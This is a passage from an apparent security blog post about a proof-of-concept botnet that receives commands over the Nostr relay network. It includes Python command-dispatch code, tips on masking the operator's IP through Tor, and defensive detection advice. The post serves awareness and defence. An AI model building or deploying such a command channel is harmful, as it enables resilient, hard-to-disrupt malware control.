+</span></span></code></pre></div><p>As I said, let&rsquo;s keep it simple. Each <strong><red>payload</red></strong> is just a dict <code>{ &quot;command&quot; : command, &quot;args&quot; : args }</code> turned into a dict, and relayd through the <strong><green>Nostr network</green></strong>. The parsing on the bot side this way is super simple. We turn the message we get from the relay into <strong><blue>JSON</blue></strong> if we can, and just get the values of both keys. We can then check if the <code>command</code> value as string is found from the <code>COMMANDS</code> Dict, and directly call it with the args we get from <code>args</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute_command</span>( message : dict ) <span style="color:#f92672">-&gt;</span> bool:
+</span></span><span style="display:flex;"><span>    raw_msg <span style="color:#f92672">=</span> message[ <span style="color:#e6db74">&#34;content&#34;</span> ]
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads( raw_msg )
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Check that necessary keys exist</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        command   <span style="color:#f92672">=</span> payload[ <span style="color:#e6db74">&#34;command&#34;</span> ]
+</span></span><span style="display:flex;"><span>        arguments <span style="color:#f92672">=</span> payload[ <span style="color:#e6db74">&#34;args&#34;</span> ]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Play the command. On fail to execute, </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># simply ignore and reset the loop.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>: 
+</span></span><span style="display:flex;"><span>         COMMANDS[ command ]( arguments )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>: 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span></code></pre></div><p>Now it is just creating a UI, which can be done in any way you please, even as a website.</p>
+<h2 id="identity-and-masking-there-of">Identity and masking there of</h2>
+<p><strong><green>Nostr</green></strong> is clever because it doesn&rsquo;t tie <strong><blue>identity</blue></strong> to content &ndash; just a public key. If you do not <strong><yellow>&ldquo;bu</yellow><red>rn&rdquo;</red></strong> your key yourself by pushing identifiable information to the <strong><purple>network</purple></strong> under that key, there is no way to backtrack from the key alone who has made the publication. In case of an investigation, the other possible datapoint is the connection between the <strong><yellow>relay</yellow></strong> and the user. The <strong><yellow>relay</yellow></strong> sees three things:</p>
+<ol>
+<li>The content published</li>
+<li>The key public key &amp; signatures for the event/content</li>
+<li><strong>The IP address</strong> from which the publication has been made.</li>
+</ol>
+<p>If the user publishes content into the <strong><purple>network</purple></strong> via an IP address thats identifiable to them (residential network connection, a VPS, so on..), it&rsquo;s possible for the owner of the <strong><yellow>relay</yellow></strong> to tie the <strong><green>public key</green></strong> <strong><blue>identity</blue></strong> to an identifiable person.</p>
+<p><em><ins>So, if the relays just do logging of the IPs, we can potentially catch the attacker?</ins></em></p>
+<p>Well, in the best case. Because the protocol is accessible via <strong><red>WebSockets</red></strong>, the threat actor can simply move their &ldquo;infra&rdquo; into a HTML page, that uses the <strong><red>WS</red></strong> library to connect to <strong><green>Nostr</green></strong>, and open that page on the Tor browser. Where the page is hosted doesn&rsquo;t even matter &ndash; all the connections between the <strong><green>Nostr</green></strong> <strong><yellow>relays<yellow></strong> and the Threat Actor are now masked by the <strong><purple>Tor network</purple></strong>, meaning we can&rsquo;t tie the <strong><blue>identity</blue></strong> with the IP address.</p>
+<h2 id="so-what">So.. what?</h2>
+<p>So what is the big deal? From my understanding, this network enables malware in a way that is very difficult, <strong>if not impossible</strong>, to <strong>disrupt once after infection.</strong> The <strong><green>Nostr</green></strong> protocol is great, and offers a good approach to censorship and anonymity on the internet. I imagine the wide spread adaptation of this protocol in future for all things amazing will likely happen. More users mean more <strong><yellow>relays<yellow></strong> &ndash; more <strong><yellow>relays<yellow></strong> means its <strong><red>harder</red></strong> &amp; <strong><red>harder</red></strong> to censor content.. or stop malware. From my perspective, it&rsquo;s only a matter of time until we see implementations of this technique in actual <strong><red>malware</red></strong> out in the wild. In the case of an <strong><red>botnet</red></strong> operator, a communication channel thats practically impossible to cut off en masse is quite attractive. This method can&rsquo;t be sinkholed in a simple way, and the servers (given a good amount of relays) are difficult to take all down at once.</p>
+<p>And of course the <strong><blue>protocol</blue></strong> has it&rsquo;s limitations. Many relays require payments, and some might drop your keys or content, the connection to the relays is noisy.. But in practice, these are mostly friction points rather than full-stop walls. There is no single point of failure, as long as the implant can reach one usable relay that still carries the event, the communication path survives. <strong><purple>For defenders</purple></strong>, the friction makes noise that are actually the most actionable signals: a host making periodic <strong><green>WebSocket</green></strong> connections to known Nostr relay domains, on a randomized interval, fetching events under a consistent public key, is a pattern worth flagging. The protocol definitely wasn&rsquo;t built for stealth. It was built for resilience.</p>
+<!-- This also poses a question: <u>Are our reactive methods of fighting Malware good enough?</u>-->
+<p>That being said, the code snippets in this blog are from my proof-of-concept repository. You can find it here: <strong><a href="https://github.com/Vsimpro/nostril">Vsimpro/nostril</a></strong></p>
+<p>Please don&rsquo;t go and use this for evil. This article is meant to raise awarness, and potentially spark some conversation on how to mitigate such botnets. I hope you had a pleasant read, for any feedback and thoughts don&rsquo;t hesitate to hit me up :)
+<br>
+<br>
+Until next time,
+<br>-Vs1m.
+<br>
+<br></p>
+
 
       <ul class="pa0">
       </ul>
